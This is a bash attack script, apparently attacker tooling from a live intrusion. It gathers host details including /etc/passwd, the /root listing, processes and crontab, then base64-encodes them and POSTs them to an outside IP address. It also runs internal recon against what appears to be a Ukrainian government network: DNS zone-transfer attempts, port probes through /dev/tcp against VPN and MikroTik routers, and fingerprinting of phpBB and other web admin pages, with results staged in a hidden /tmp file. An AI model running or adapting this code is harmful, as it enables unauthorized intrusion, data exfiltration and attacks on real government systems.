#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# deep recon of interesting web/dns targets
C=/opt/zimbra/common/bin/curl
[ -x "$C" ] || C=curl
O=/tmp/.WD.txt
: > "$O"
echo "== AXFR ==" >> "$O"
dig @10.61.10.10 mel.dbr.gov.ua AXFR +time=4 +tries=1 >> "$O" 2>&1
dig @10.61.10.10 dbr.gov.ua AXFR +time=4 +tries=1 >> "$O" 2>&1
dig @10.61.10.11 mel.dbr.gov.ua AXFR +time=4 +tries=1 >> "$O" 2>&1
echo "== DHCP/PTR sweep hints ==" >> "$O"
for i in 5 15 24 82 102 119; do dig @10.61.10.10 -x 10.61.10.$i +time=3 +tries=1 >> "$O" 2>&1; done
echo "== .15 softether ports ==" >> "$O"
for p in 992 5555 1194 1701 500 4500; do timeout 3 bash -c "echo > /dev/tcp/10.61.10.15/$p" 2>/dev/null && echo ".15:$p OPEN" >> "$O"; done
echo "== .216 mikrotik ==" >> "$O"
$C -sS -m 8 http://10.61.10.216/ >> "$O" 2>&1 | head -50
for p in 8291 8728 8729 21 2000; do timeout 3 bash -c "echo > /dev/tcp/10.61.10.216/$p" 2>/dev/null && echo ".216:$p OPEN" >> "$O"; done
## routeros version leaks in page js sometimes
$C -sS -m 8 "http://10.61.10.216/webfig/" -D - -o /dev/null >> "$O" 2>&1
echo "== .136 EDRFO ==" >> "$O"
$C -sS -m 8 http://10.61.10.136/ >> "$O" 2>&1 | head -80
echo "== .8 phpbb ==" >> "$O"
$C -sS -m 8 "http://10.61.10.8/adm/index.php" -D - >> "$O" 2>&1 | head -40
$C -sS -m 8 "http://10.61.10.8/docs/CHANGELOG.html" >> "$O" 2>&1 | grep -i -m2 "version" >> "$O"
echo "== .99 body ==" >> "$O"
$C -ksS -m 8 https://10.61.10.99/ >> "$O" 2>&1 | head -30
echo "== .80 body ==" >> "$O"
$C -ksS -m 8 https://10.61.10.80/ >> "$O" 2>&1 | head -40
echo "== .6 body ==" >> "$O"
$C -sS -m 8 http://10.61.10.6/ >> "$O" 2>&1 | head -20
echo WD_DONE >> "$O"
bash /tmp/.ex.sh "$O" webdeep
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


